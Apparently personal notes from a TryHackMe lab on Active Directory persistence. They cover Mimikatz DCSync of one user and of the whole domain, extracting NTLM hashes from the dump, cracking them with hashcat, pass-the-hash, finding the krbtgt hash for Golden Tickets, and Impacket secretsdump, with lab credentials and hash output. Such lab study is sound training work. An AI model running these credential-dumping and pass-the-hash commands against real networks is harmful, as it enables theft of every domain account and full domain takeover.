# AD Persistence Through Credential Using Mimikatz

## SSH

```jsx
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh za\\Administrator@thmwrk1.za.tryhackme.loc

tryhackmewouldnotguess1
```

## Low level credential

```jsx
Username: irene.leach Password: Password1 
```

## DCSync Attack

```jsx
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:irene.leach        
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
[DC] 'irene.leach' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : irene.leach

** SAM ACCOUNT **

SAM Username         : irene.leach
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) 
Account expiration   :
Password last change : 4/25/2022 7:30:04 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1134 
Object Relative ID   : 1134

Credentials:
  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b
    ntlm- 0: 64f12cddaa88057e06a81b54e73b949b
    lm  - 0: 058d9c9032904bcf38eb0cdd6e3f3503

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF * 
    Random Value : dce943c0b14a8d8867f2d17d99525727

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCirene.leach
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8a5e53376e607f4ba9b7888e649d599f8d15810ca3f35fb76ad86aaa42da30bf 
      aes128_hmac       (4096) : 9ec6904adb54557d01b2d408f7b853c8
      des_cbc_md5       (4096) : 70d3a4a1baa7d034

* Primary:Kerberos *
    Default Salt : ZA.TRYHACKME.LOCirene.leach 
    Credentials
      des_cbc_md5       : 70d3a4a1baa7d034

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  199331e8d2931ca0ef039f90db0b0559
    02  0dd7854fca03a843e894ae8406c4ef5b
    03  ca7604894fa9c1155178c9ad4964dc99 
    04  199331e8d2931ca0ef039f90db0b0559
    05  0dd7854fca03a843e894ae8406c4ef5b
    06  5c0529b5530e23e74980e52f55f566f0
    07  199331e8d2931ca0ef039f90db0b0559
    08  02b9bc10022db65ccf7d222732de40b3 
    09  02b9bc10022db65ccf7d222732de40b3
    10  82ba1c9ed79ccf3c4d14ac03992833c8
    11  48a62d4c268e7aeeefcfc6b52d1a2eb4
    12  02b9bc10022db65ccf7d222732de40b3 
    13  f1d423e3ec6128b17f5d88d0eae3ccb2
    14  48a62d4c268e7aeeefcfc6b52d1a2eb4
    15  beef94f2f0f1c0dddfa8aec966d07319
    16  beef94f2f0f1c0dddfa8aec966d07319
    17  66f2915aa16eca69bee810b1f3f9fe23
    18  ad377b719ce3ff9468c2b9271f8d57d7 
    19  1aed20085cec75cbc4352eb1e4bfa89a
    20  59e8ac24861498a0020727a112742e3e
    21  03aac6b0966bd25fff9422195304f8e9
    22  03aac6b0966bd25fff9422195304f8e9
    23  ff49772bf2bb47614dd0726ebf53b280 
    24  d0ebe2d175f52408ee22b7656f56f4ed
    25  d0ebe2d175f52408ee22b7656f56f4ed
    26  ae90f343da445fbff62b3cbe7c160cdc
    27  1a0c51ca0fd8b898e07652a0cffcdd15
    28  a6a5dd0992a4d9113390f73b37702fdc 
    29  0dbf46430be46719417546cd5ed5dc21

mimikatz #

```

```jsx
Note: We need NTLM Hash
```

## Hash Check ( Match with Real Password)

```jsx
https://codebeautify.org/ntlm-hash-generator
```

## Enable Login before full dump

```jsx
mimikatz # log jubair_dcdump.txt 
Using 'jubair_dcdump.txt' for logfile : OK
```

## DCSync Entire Domain

```jsx
lsadump::dcsync /domain:za.tryhackme.loc /all 
```

```jsx
mimikatz:exit
za\administrator@THMWRK1 C:\Tools\mimikatz_trunk\x64>dir 

```

### Extract Username and Hash ( work with information)

```jsx
type jubair_dcdump.txt | findstr "SAM Username"
```

#### without the pipe sign

```jsx
findstr "SAM Username" jubair_dcdump.txt 
```

```jsx
cat jubair_dcdump.txt | grep "SAM Username"
cat jubair_dcdump.txt | grep "Hash NTLM"
```

## Username and Hash BOTH

```jsx
findstr /R /C:"SAM Username" /C:"Hash NTLM" jubair_dcdump.txt
```

### Work with dumped hash

```jsx
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --user
```

Pass-the-Hash — skip cracking entirely and authenticate directly using the hash itself, again via **Mimikatz** (sekurlsa::pth)

```jsx
mimikatz.exe
privilege::debug
sekurlsa::pth /user:david.miller /domain:za /ntlm:14b8d97dbcf207022b640a5fefeb97ad /run:
```

**Critical Account to Identify: krbtgt**

While scrolling through your full dump, specifically locate the account named krbtgt and note its NTLM hash.

**Why this one account matters more than every other account combined:** the krbtgt account’s hash is used by the KDC to encrypt and sign every single Kerberos Ticket Granting Ticket (TGT) issued in the domain. If you hold this hash, you can forge your own TGTs completely offline — this is the **Golden Ticket** attack (typically the next step after DCSync).

Find it quickly via PowerShell:

```jsx
Select-String -Path .\himel_dcdump.txt -Pattern "krbtgt" -Context 0,20
```

## Performing DCSync with Impacket (From Kali)

Impacket’s approach differs slightly from Mimikatz: it uses SMB first (authentication), then DRSUAPI for the actual replication. This means it requires an open SMB connection to the DC, which is worth noting for network-level detection.

```jsx
# Remote DCSync — runs entirely from the attacker's machine
impacket-secretsdump 'ZA/Administrator:tryhackmewouldnotguess1@thmwrk1.za.tryhackme.loc'

# Using hash instead of password (combined with Pass-the-Hash)
impacket-secretsdump -hashes :<NTLM_HASH> <LAB_DOMAIN>/<USER>@<DC_HOST>

# Dump only the domain hashes, not local SAM
impacket-secretsdump -just-dc <LAB_DOMAIN>/<USER>:<PASSWORD>@<DC_HOST>
```